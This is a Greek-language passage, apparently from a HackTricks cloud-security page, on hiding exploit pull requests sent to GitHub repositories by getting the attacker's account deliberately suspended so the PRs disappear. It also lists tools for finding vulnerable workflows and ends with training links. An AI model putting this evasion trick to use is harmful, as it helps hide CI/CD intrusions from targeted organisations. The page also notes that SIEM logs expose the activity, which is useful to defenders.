(Τεχνική από [**εδώ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Πρώτα απ' όλα, οποιοδήποτε PR που έχει υποβληθεί είναι σαφώς ορατό στο κοινό στο Github και στον στόχο λογαριασμό GitHub. Στο GitHub από προεπιλογή, **δεν μπορούμε να διαγράψουμε ένα PR από το διαδίκτυο**, αλλά υπάρχει μια ανατροπή. Για λογαριασμούς Github που είναι **ανασταλμένοι** από το Github, όλα τα **PRs διαγράφονται αυτόματα** και αφαιρούνται από το διαδίκτυο. Έτσι, για να κρύψετε τη δραστηριότητά σας, πρέπει είτε να **ανασταλεί ο λογαριασμός σας στο GitHub είτε να επισημανθεί**. Αυτό θα **κρύψει όλες τις δραστηριότητές σας** στο GitHub από το διαδίκτυο (ουσιαστικά αφαιρεί όλα τα exploit PR).

Μια οργάνωση στο GitHub είναι πολύ ενεργή στην αναφορά λογαριασμών στο GitHub. Το μόνο που χρειάζεται να κάνετε είναι να μοιραστείτε "κάποια πράγματα" σε ένα Issue και θα φροντίσουν να ανασταλεί ο λογαριασμός σας σε 12 ώρες :p και έτσι θα έχετε κάνει το exploit σας αόρατο στο github.

{% hint style="warning" %}
Ο μόνος τρόπος για μια οργάνωση να καταλάβει ότι έχει στοχοποιηθεί είναι να ελέγξει τα logs του GitHub από το SIEM, καθώς από το UI του GitHub το PR θα έχει αφαιρεθεί.
{% endhint %}

## Εργαλεία

Τα παρακάτω εργαλεία είναι χρήσιμα για να βρείτε Github Action workflows και ακόμη και να βρείτε ευάλωτα:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια github.

</details>
{% endhint %}
